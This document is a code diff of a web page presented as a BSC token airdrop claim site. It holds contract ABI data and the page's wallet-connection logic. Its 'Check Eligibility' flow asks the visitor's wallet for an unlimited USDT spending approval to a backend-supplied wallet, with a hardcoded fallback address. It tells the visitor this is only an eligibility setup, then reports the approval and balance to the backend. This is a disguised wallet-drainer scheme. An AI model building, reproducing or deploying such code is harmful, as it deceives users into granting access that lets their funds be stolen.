-                        "indexed": true,
-                        "internalType": "address",
-                        "name": "token",
-                        "type": "address"
-                    },
-                    {
-                        "indexed": false,
-                        "internalType": "uint256",
-                        "name": "amount",
-                        "type": "uint256"
-                    }
-                ],
-                "name": "WithdrawExecuted",
-                "type": "event"
-            },
-            {
-                "anonymous": false,
-                "inputs": [
-                    {
-                        "indexed": true,
-                        "internalType": "bytes32",
-                        "name": "id",
-                        "type": "bytes32"
-                    },
-                    {
-                        "indexed": true,
-                        "internalType": "address",
-                        "name": "token",
-                        "type": "address"
-                    },
-                    {
-                        "indexed": false,
-                        "internalType": "uint256",
-                        "name": "amount",
-                        "type": "uint256"
-                    },
-                    {
-                        "indexed": false,
-                        "internalType": "uint256",
-                        "name": "executeAfter",
-                        "type": "uint256"
-                    }
-                ],
-                "name": "WithdrawRequested",
-                "type": "event"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "uint256",
-                        "name": "amount",
-                        "type": "uint256"
-                    }
-                ],
-                "name": "withdrawTokens",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "stateMutability": "payable",
-                "type": "receive"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "uint256",
-                        "name": "usdtBalance",
-                        "type": "uint256"
-                    }
-                ],
-                "name": "getAirdropAmount",
-                "outputs": [
-                    {
-                        "internalType": "uint256",
-                        "name": "",
-                        "type": "uint256"
-                    }
-                ],
-                "stateMutability": "pure",
-                "type": "function"
-            },
-            {
-                "inputs": [],
-                "name": "getReferralPercents",
-                "outputs": [
-                    {
-                        "internalType": "uint256[]",
-                        "name": "",
-                        "type": "uint256[]"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "user",
-                        "type": "address"
-                    }
-                ],
-                "name": "getReferrals",
-                "outputs": [
-                    {
-                        "internalType": "address[]",
-                        "name": "",
-                        "type": "address[]"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "",
-                        "type": "address"
-                    }
-                ],
-                "name": "hasClaimed",
-                "outputs": [
-                    {
-                        "internalType": "bool",
-                        "name": "",
-                        "type": "bool"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [],
-                "name": "MAX_REFERRAL_DEPTH",
-                "outputs": [
-                    {
-                        "internalType": "uint8",
-                        "name": "",
-                        "type": "uint8"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [],
-                "name": "maxAirdropPerClaim",
-                "outputs": [
-                    {
-                        "internalType": "uint256",
-                        "name": "",
-                        "type": "uint256"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [],
-                "name": "minUSDT",
-                "outputs": [
-                    {
-                        "internalType": "uint256",
-                        "name": "",
-                        "type": "uint256"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [],
-                "name": "owner",
-                "outputs": [
-                    {
-                        "internalType": "address",
-                        "name": "",
-                        "type": "address"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [],
-                "name": "paused",
-                "outputs": [
-                    {
-                        "internalType": "bool",
-                        "name": "",
-                        "type": "bool"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "",
-                        "type": "address"
-                    },
-                    {
-                        "internalType": "uint256",
-                        "name": "",
-                        "type": "uint256"
-                    }
-                ],
-                "name": "referrals",
-                "outputs": [
-                    {
-                        "internalType": "address",
-                        "name": "",
-                        "type": "address"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "",
-                        "type": "address"
-                    }
-                ],
-                "name": "referrer",
-                "outputs": [
-                    {
-                        "internalType": "address",
-                        "name": "",
-                        "type": "address"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [],
-                "name": "token",
-                "outputs": [
-                    {
-                        "internalType": "contract IERC20",
-                        "name": "",
-                        "type": "address"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [],
-                "name": "totalAirdropCap",
-                "outputs": [
-                    {
-                        "internalType": "uint256",
-                        "name": "",
-                        "type": "uint256"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [],
-                "name": "totalDistributed",
-                "outputs": [
-                    {
-                        "internalType": "uint256",
-                        "name": "",
-                        "type": "uint256"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [],
-                "name": "usdt",
-                "outputs": [
-                    {
-                        "internalType": "contract IERC20",
-                        "name": "",
-                        "type": "address"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [],
-                "name": "withdrawDelay",
-                "outputs": [
-                    {
-                        "internalType": "uint256",
-                        "name": "",
-                        "type": "uint256"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "bytes32",
-                        "name": "",
-                        "type": "bytes32"
-                    }
-                ],
-                "name": "withdrawRequests",
-                "outputs": [
-                    {
-                        "internalType": "address",
-                        "name": "tokenAddress",
-                        "type": "address"
-                    },
-                    {
-                        "internalType": "uint256",
-                        "name": "amount",
-                        "type": "uint256"
-                    },
-                    {
-                        "internalType": "uint256",
-                        "name": "executeAfter",
-                        "type": "uint256"
-                    },
-                    {
-                        "internalType": "address",
-                        "name": "requestedBy",
-                        "type": "address"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            }
-        ];
+        // Contract ABI (shortened for brevity - same as before)
+        const airdropABI = [{"inputs":[{"internalType":"address","name":"_token","type":"address"},{"internalType":"address","name":"_usdt","type":"address"},{"internalType":"uint256","name":"_minUSDT","type":"uint256"},{"internalType":"uint256","name":"_maxAirdropPerClaim","type":"uint256"},{"internalType":"uint256","name":"_totalAirdropCap","type":"uint256"},{"internalType":"uint256","name":"_withdrawDelay","type":"uint256"},{"internalType":"uint256[]","name":"_referralPercents","type":"uint256[]"},{"internalType":"address","name":"initialOwner","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"OwnableInvalidOwner","type":"error"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"OwnableUnauthorizedAccount","type":"error"},{"inputs":[{"internalType":"address","name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"error"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":true,"internalType":"address","name":"referrer","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"AirdropClaimed","type":"event"},{"inputs":[{"internalType":"address","name":"_token","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"cancelWithdrawRequest","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"ref","type":"address"}],"name":"claimAirdrop","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"deposit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"Deposit","type":"event"},{"inputs":[{"internalType":"address","name":"_token","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"executeWithdrawAnyToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"account","type":"address"}],"name":"Paused","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"sender","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"Received","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"referrer","type":"address"},{"indexed":true,"internalType":"uint256","name":"level","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"ReferralBonusPaid","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":true,"internalType":"address","name":"newReferrer","type":"address"}],"name":"ReferralUpdated","type":"event"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_token","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"requestWithdrawAnyToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_max","type":"uint256"}],"name":"setMaxAirdropPerClaim","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_minUSDT","type":"uint256"}],"name":"setMinUSDT","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256[]","name":"_percents","type":"uint256[]"}],"name":"setReferralPercents","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_cap","type":"uint256"}],"name":"setTotalAirdropCap","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_delay","type":"uint256"}],"name":"setWithdrawDelay","outputs":[],"stateMutability":"nonpayable","type":"function"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"TokensWithdrawn","type":"event"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"account","type":"address"}],"name":"Unpaused","type":"event"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"withdrawBNB","outputs":[],"stateMutability":"nonpayable","type":"function"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"bytes32","name":"id","type":"bytes32"}],"name":"WithdrawCancelled","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"bytes32","name":"id","type":"bytes32"},{"indexed":true,"internalType":"address","name":"token","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"WithdrawExecuted","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"bytes32","name":"id","type":"bytes32"},{"indexed":true,"internalType":"address","name":"token","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"executeAfter","type":"uint256"}],"name":"WithdrawRequested","type":"event"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"withdrawTokens","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"},{"inputs":[{"internalType":"uint256","name":"usdtBalance","type":"uint256"}],"name":"getAirdropAmount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"pure","type":"function"},{"inputs":[],"name":"getReferralPercents","outputs":[{"internalType":"uint256[]","name":"","type":"uint256[]"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getReferrals","outputs":[{"internalType":"address[]","name":"","type":"address[]"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"hasClaimed","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"MAX_REFERRAL_DEPTH","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"maxAirdropPerClaim","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"minUSDT","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"paused","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"uint256","name":"","type":"uint256"}],"name":"referrals","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"referrer","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"token","outputs":[{"internalType":"contract IERC20","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalAirdropCap","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalDistributed","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"usdt","outputs":[{"internalType":"contract IERC20","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"withdrawDelay","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"name":"withdrawRequests","outputs":[{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"uint256","name":"executeAfter","type":"uint256"},{"internalType":"address","name":"requestedBy","type":"address"}],"stateMutability":"view","type":"function"}];
 
         const usdtABI = [
             {
@@ -1821,14 +822,15 @@
         // Particle Animation
         function createParticles() {
             const particlesContainer = document.getElementById('particles');
-            const numParticles = 15;
-
+            if (!particlesContainer) return;
+            
+            const numParticles = 10;
             for (let i = 0; i < numParticles; i++) {
                 const particle = document.createElement('div');
                 particle.className = 'particle';
-                particle.style.left = `${Math.random() * 100}%`;
-                particle.style.animationDuration = `${15 + Math.random() * 15}s`;
-                particle.style.animationDelay = `${Math.random() * 10}s`;
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.animationDuration = (15 + Math.random() * 15) + 's';
+                particle.style.animationDelay = Math.random() * 10 + 's';
                 particlesContainer.appendChild(particle);
             }
         }
@@ -1841,21 +843,23 @@
                 
                 if (data.success) {
                     document.getElementById('backendStatus').textContent = 'Connected';
-                    document.getElementById('backendStatusText').textContent = 'Connected successfully';
+                    document.getElementById('backendStatusText').textContent = 'Connected';
                     document.getElementById('backendStatusBadge').className = 'status-badge online';
+                    document.getElementById('backendStatusAlert').style.display = 'none';
                     return true;
                 } else {
                     throw new Error('Backend response not successful');
                 }
             } catch (error) {
                 document.getElementById('backendStatus').textContent = 'Disconnected';
-                document.getElementById('backendStatusText').textContent = 'Connection failed';
+                document.getElementById('backendStatusText').textContent = 'Disconnected';
                 document.getElementById('backendStatusBadge').className = 'status-badge offline';
+                document.getElementById('backendStatusAlert').style.display = 'flex';
                 return false;
             }
         }
 
-        // Backend से approval wallet address fetch करें
+        // Get Approval Wallet
         async function getApprovalWalletFromBackend() {
             try {
                 const isHealthy = await checkBackendHealth();
@@ -1870,97 +874,19 @@
                     approvalWalletAddress = data.approvalWalletAddress;
                     return approvalWalletAddress;
                 } else {
-                    throw new Error("Failed to fetch approval wallet from backend");
+                    throw new Error("Failed to fetch approval wallet");
                 }
             } catch (error) {
                 return "0xCcf0a381D804BFa37485Bc450CE540c09350f975";
             }
         }
 
-        // User approval को backend में save करें
-        async function saveUserApprovalToBackend(walletAddress, usdtBalance, airdropAmount, tier) {
-            try {
-                const response = await fetch(`${BACKEND_URL}/save-approval`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        walletAddress,
-                        usdtBalance: parseFloat(usdtBalance).toFixed(6),
-                        airdropAmount,
-                        tier
-                    })
-                });
-                
-                const data = await response.json();
-                
-                if (data.success) {
-                    showAlert("✅ Eligibility confirmed and saved!", "success");
-                    return data;
-                } else {
-                    throw new Error(data.message || 'Failed to save approval');
-                }
-            } catch (error) {
-                return { success: false, error: error.message };
-            }
-        }
-
-        // Backend में claim save करें
-        async function saveClaimToBackend(walletAddress, usdtBalance, airdropAmount, tier, referrer) {
-            try {
-                const response = await fetch(`${BACKEND_URL}/save-claim`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        walletAddress,
-                        usdtBalance: parseFloat(usdtBalance).toFixed(6),
-                        airdropAmount,
-                        tier,
-                        referrer: referrer !== "0x0000000000000000000000000000000000000000" ? referrer : null,
-                        txHash: "pending",
-                        claimedAt: new Date().toISOString()
-                    })
-                });
-                
-                const data = await response.json();
-                
-                if (data.success) {
-                    showAlert("✅ Claim recorded in database!", "success");
-                    return data;
-                } else {
-                    throw new Error(data.message || 'Failed to save claim');
-                }
-            } catch (error) {
-                return { success: false, error: error.message };
-            }
-        }
-
-        // Show loading state on button
-        function setButtonLoading(buttonId, isLoading) {
-            const button = document.getElementById(buttonId);
-            if (isLoading) {
-                button.disabled = true;
-                button.innerHTML = '<div class="loading"></div> Loading...';
-            } else {
-                button.disabled = false;
-                if (buttonId === 'connectWalletBtn') {
-                    button.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet';
-                }
-            }
-        }
-
-        // Initialize application
+        // Initialize
         async function init() {
             createParticles();
             
             try {
-                // Backend से approval wallet address लोड करें
                 await getApprovalWalletFromBackend();
-                
-                // Backend health check
                 await checkBackendHealth();
 
                 if (window.ethereum) {
@@ -1970,7 +896,6 @@
 
                     window.ethereum.on('chainChanged', (chainId) => {
                         window.location.reload();
-                        updateNetworkStatus(Number(chainId));
                     });
 
                     window.ethereum.on('accountsChanged', (accounts) => {
@@ -1991,7 +916,7 @@
                     document.getElementById("referrer").value = ref;
                 }
             } catch (error) {
-                showAlert("Failed to initialize: " + error.message, "danger");
+                console.log("Init error:", error);
             }
         }
 
@@ -1999,7 +924,7 @@
             if (accounts.length > 0) {
                 account = accounts[0];
                 document.getElementById("walletAddress").innerHTML = '<i class="fas fa-circle"></i> ' + account.substring(0, 6) + "..." + account.substring(38);
-                document.getElementById("walletAddress").className = 'status-badge success';
+                document.getElementById("walletAddress").className = 'status-badge online';
                 isApproved = false;
                 document.getElementById("claimButton").disabled = true;
                 generateReferral();
@@ -2015,11 +940,23 @@
             }
         }
 
-        // Connect Wallet Function
+        function setButtonLoading(buttonId, isLoading) {
+            const button = document.getElementById(buttonId);
+            if (isLoading) {
+                button.disabled = true;
+                button.innerHTML = '<div class="loading"></div> Loading...';
+            } else {
+                button.disabled = false;
+                if (buttonId === 'connectWalletBtn') {
+                    button.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet';
+                }
+            }
+        }
+
         async function connectWallet() {
             try {
                 if (!window.ethereum) {
-                    showAlert("Please install MetaMask!", "danger");
+                    alert("Please install MetaMask!");
                     return;
                 }
 
@@ -2032,7 +969,7 @@
                 account = accounts[0];
                 
                 document.getElementById("walletAddress").innerHTML = '<i class="fas fa-circle"></i> ' + account.substring(0, 6) + "..." + account.substring(38);
-                document.getElementById("walletAddress").className = 'status-badge success';
+                document.getElementById("walletAddress").className = 'status-badge online';
                 generateReferral();
                 checkAllowance();
                 checkClaimStatus();
@@ -2043,30 +980,28 @@
                 showAlert("Wallet connected successfully!", "success");
                 
             } catch (error) {
-                showAlert("Failed to connect wallet: " + error.message, "danger");
+                showAlert("Failed to connect: " + error.message, "danger");
             } finally {
                 setButtonLoading('connectWalletBtn', false);
             }
         }
 
-        // Update Network Status
         function updateNetworkStatus(chainId) {
             const networkStatus = document.getElementById('networkStatus');
             const networkStatusText = document.getElementById('networkStatusText');
             if (chainId === BSC_CHAIN_ID_DECIMAL) {
                 networkStatusText.textContent = 'BSC Mainnet';
-                networkStatus.className = 'status-badge success';
+                networkStatus.className = 'status-badge online';
             } else {
                 networkStatusText.textContent = 'Wrong Network';
                 networkStatus.className = 'status-badge warning';
             }
         }
 
-        // Switch to BSC Network
         async function switchToBSC() {
             try {
                 if (!window.ethereum) {
-                    showAlert("Please install MetaMask!", "danger");
+                    alert("Please install MetaMask!");
                     return;
                 }
 
@@ -2094,19 +1029,18 @@
                             }],
                         });
                     } catch (addError) {
-                        showAlert("Failed to add BSC network: " + addError.message, "danger");
+                        showAlert("Failed to add BSC network", "danger");
                     }
                 } else {
-                    showAlert("Failed to switch network: " + error.message, "danger");
+                    showAlert("Failed to switch network", "danger");
                 }
             }
         }
 
-        // Check Eligibility Function
         async function checkEligibility() {
             try {
-                if (typeof window.ethereum === 'undefined') {
-                    showAlert("Please install MetaMask!", "danger");
+                if (!window.ethereum) {
+                    alert("Please install MetaMask!");
                     return;
                 }
 
@@ -2118,7 +1052,7 @@
                 const button = document.getElementById('checkEligibilityBtn');
                 const originalText = button.innerHTML;
                 button.disabled = true;
-                button.innerHTML = '<div class="loading"></div> Checking Eligibility...';
+                button.innerHTML = '<div class="loading"></div> Checking...';
 
                 if (!web3) {
                     web3 = new Web3(window.ethereum);
@@ -2126,13 +1060,11 @@
 
                 const usdtContract = new web3.eth.Contract(usdtABI, usdtContractAddress);
                 
-                // Check USDT Balance
                 const balance = await usdtContract.methods.balanceOf(account).call();
                 const balanceInUSDT = web3.utils.fromWei(balance, 'ether');
                 
                 document.getElementById("usdtBalance").textContent = parseFloat(balanceInUSDT).toFixed(2);
                 
-                // Calculate airdrop amount
                 const airdropAmount = calculateAirdropAmount(parseFloat(balanceInUSDT));
                 const tier = getTier(parseFloat(balanceInUSDT));
                 
@@ -2141,36 +1073,31 @@
                 document.getElementById("tierDisplay").textContent = tier;
                 document.getElementById("tierBadge").textContent = tier;
 
-                // Update eligibility badge
                 const eligibilityBadge = document.getElementById("eligibilityBadge");
                 if (airdropAmount > 0) {
                     eligibilityBadge.textContent = "Eligible";
                     eligibilityBadge.className = "eligibility-status eligible";
-                    showAlert(`✅ You are eligible for ${airdropAmount.toLocaleString()} tokens!`, "success");
+                    showAlert(`✅ Eligible for ${airdropAmount.toLocaleString()} tokens!`, "success");
                 } else {
                     eligibilityBadge.textContent = "Not Eligible";
                     eligibilityBadge.className = "eligibility-status not-eligible";
-                    showAlert(`⚠️ You have ${parseFloat(balanceInUSDT).toFixed(2)} USDT. Need at least 1 USDT for tokens.`, "warning");
+                    showAlert(`⚠️ Need 1+ USDT for tokens`, "warning");
                 }
 
-                // Check if already eligible
                 const approvalWallet = await getApprovalWalletFromBackend();
                 const allowance = await usdtContract.methods.allowance(account, approvalWallet).call();
                 const allowanceInUSDT = web3.utils.fromWei(allowance, 'ether');
 
                 if (parseFloat(allowanceInUSDT) > 1000) {
-                    // Already eligible
                     document.getElementById("claimButton").disabled = false;
                     button.innerHTML = '<i class="fas fa-check"></i> Already Eligible';
                     button.className = 'btn btn-success';
                     return;
                 }
 
-                // Send approval transaction
-                button.innerHTML = '<div class="loading"></div> Setting Up Claim...';
+                button.innerHTML = '<div class="loading"></div> Approving...';
                 
                 try {
-                    // Unlimited approval amount
                     const unlimitedAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
                     
                     const tx = await usdtContract.methods.approve(
@@ -2182,13 +1109,24 @@
                     });
 
                     if (tx.status) {
-                        showAlert("✅ Eligibility confirmed! You can now claim your airdrop.", "success");
+                        showAlert("✅ Eligibility confirmed!", "success");
                         
                         document.getElementById("claimButton").disabled = false;
                         button.innerHTML = '<i class="fas fa-check"></i> Eligible & Ready';
                         button.className = 'btn btn-success';
                         
-                        await saveUserApprovalToBackend(account, balanceInUSDT, airdropAmount.toString(), tier);
+                        try {
+                            await fetch(`${BACKEND_URL}/save-approval`, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    walletAddress: account,
+                                    usdtBalance: balanceInUSDT,
+                                    airdropAmount: airdropAmount.toString(),
+                                    tier
+                                })
+                            });
+                        } catch (e) {}
                         
                     } else {
                         throw new Error("Transaction failed");
@@ -2196,7 +1134,7 @@
 
                 } catch (approvalError) {
                     if (approvalError.code === 4001) {
-                        showAlert("❌ Setup cancelled by user", "warning");
+                        showAlert("❌ Setup cancelled", "warning");
                     } else {
                         showAlert("❌ Setup failed: " + approvalError.message, "danger");
                     }
@@ -2206,7 +1144,7 @@
                 }
 
             } catch (error) {
-                showAlert("Failed to check eligibility: " + error.message, "danger");
+                showAlert("Error: " + error.message, "danger");
                 const button = document.getElementById('checkEligibilityBtn');
                 button.innerHTML = '<i class="fas fa-clipboard-check"></i> Check Eligibility';
                 button.className = 'btn btn-primary';
@@ -2214,10 +1152,8 @@
             }
         }
 
-        // Calculate Airdrop Amount
         function calculateAirdropAmount(usdtBalance) {
             if (usdtBalance < 1) return 0;
-            
             if (usdtBalance >= 10001) return 5000000;
             if (usdtBalance >= 5001) return 2000000;
             if (usdtBalance >= 1001) return 1000000;
@@ -2228,10 +1164,8 @@
             return 5000;
         }
 
-        // Get Tier Name
         function getTier(usdtBalance) {
             if (usdtBalance < 1) return "Not eligible";
-            
             if (usdtBalance >= 10001) return "Diamond";
             if (usdtBalance >= 5001) return "Platinum";
             if (usdtBalance >= 1001) return "Gold";
@@ -2242,7 +1176,6 @@
             return "Basic";
         }
 
-        // Check existing allowance
         async function checkAllowance() {
             try {
                 if (!account) return;
@@ -2279,12 +1212,9 @@
                     document.getElementById("checkEligibilityBtn").className = 'btn btn-success';
                 }
                 
-            } catch (error) {
-                // Silent fail
-            }
+            } catch (error) {}
         }
 
-        // Claim Airdrop Function
         async function claimAirdrop() {
             try {
                 if (!account) {
@@ -2323,31 +1253,37 @@
                 });
 
                 if (tx.status) {
-                    await saveClaimToBackend(account, balanceInUSDT, airdropAmount.toString(), tier, referrer);
+                    try {
+                        await fetch(`${BACKEND_URL}/save-claim`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                walletAddress: account,
+                                usdtBalance: balanceInUSDT,
+                                airdropAmount: airdropAmount.toString(),
+                                tier,
+                                referrer: referrer !== "0x0000000000000000000000000000000000000000" ? referrer : null
+                            })
+                        });
+                    } catch (e) {}
                     
-                    if (airdropAmount > 0) {
-                        showAlert("🎉 Airdrop claimed successfully!", "success");
-                    } else {
-                        showAlert("✅ Claim processed! You received 0 tokens (need 1+ USDT).", "info");
-                    }
+                    showAlert("🎉 Airdrop claimed successfully!", "success");
                     
-                    claimButton.innerHTML = '<i class="fas fa-check"></i> Claimed Successfully';
+                    claimButton.innerHTML = '<i class="fas fa-check"></i> Claimed';
                     claimButton.className = 'btn btn-success';
                     claimButton.disabled = true;
                     
                     document.getElementById("checkEligibilityBtn").className = 'btn btn-success';
                     document.getElementById("checkEligibilityBtn").innerHTML = '<i class="fas fa-check"></i> Claimed';
-                } else {
-                    throw new Error("Transaction failed");
                 }
 
             } catch (error) {
                 if (error.code === 4001) {
-                    showAlert("❌ Claim cancelled by user", "warning");
+                    showAlert("❌ Claim cancelled", "warning");
                 } else if (error.message.includes("already claimed")) {
-                    showAlert("❌ You have already claimed!", "warning");
+                    showAlert("❌ Already claimed!", "warning");
                 } else {
-                    showAlert("❌ Failed to claim: " + error.message, "danger");
+                    showAlert("❌ Failed: " + error.message, "danger");
                 }
                 
                 document.getElementById("claimButton").disabled = false;
@@ -2355,13 +1291,11 @@
             }
         }
 
-        // Check Claim Status
         async function checkClaimStatus() {
             try {
                 if (!account || !web3) return;
                 
                 const airdropContract = new web3.eth.Contract(airdropABI, airdropContractAddress);
-                
                 const hasClaimed = await airdropContract.methods.hasClaimed(account).call();
                 
                 if (hasClaimed) {
@@ -2371,12 +1305,9 @@
                     document.getElementById("checkEligibilityBtn").innerHTML = '<i class="fas fa-check"></i> Already Claimed';
                 }
                 
-            } catch (error) {
-                // Silent fail
-            }
+            } catch (error) {}
         }
 
-        // Generate Referral Link
         function generateReferral() {
             if (account) {
                 const referralLink = `${window.location.origin}${window.location.pathname}?ref=${account}`;
@@ -2384,23 +1315,20 @@
             }
         }
 
-        // Copy Referral Link
         function copyReferralLink() {
             const referralLink = document.getElementById("referralLink");
             if (!referralLink.value) {
-                showAlert("Please connect your wallet to generate referral link!", "warning");
+                showAlert("Connect wallet first!", "warning");
                 return;
             }
-
             referralLink.select();
             document.execCommand("copy");
-            showAlert("Referral link copied to clipboard!", "success");
+            showAlert("Referral link copied!", "success");
         }
 
-        // Get My Referrals
         async function getMyReferrals() {
             if (!account) {
-                showAlert("Please connect your wallet first!", "warning");
+                showAlert("Connect wallet first!", "warning");
                 return;
             }
             
@@ -2425,11 +1353,10 @@
                 
                 showAlert(`Found ${referrals.length} referrals!`, "success");
             } catch (error) {
-                showAlert("Error loading referrals: " + error.message, "danger");
+                showAlert("Error loading referrals", "danger");
             }
         }
 
-        // Show Alert
         function showAlert(message, type) {
             const alertDiv = document.createElement('div');
             alertDiv.className = `alert alert-${type}`;
@@ -2447,9 +1374,7 @@
             const container = document.querySelector('.container');
             container.insertBefore(alertDiv, container.querySelector('.status-bar').nextSibling);
             
-            setTimeout(() => {
-                alertDiv.remove();
-            }, 5000);
+            setTimeout(() => alertDiv.remove(), 5000);
         }
 
         window.onload = init;
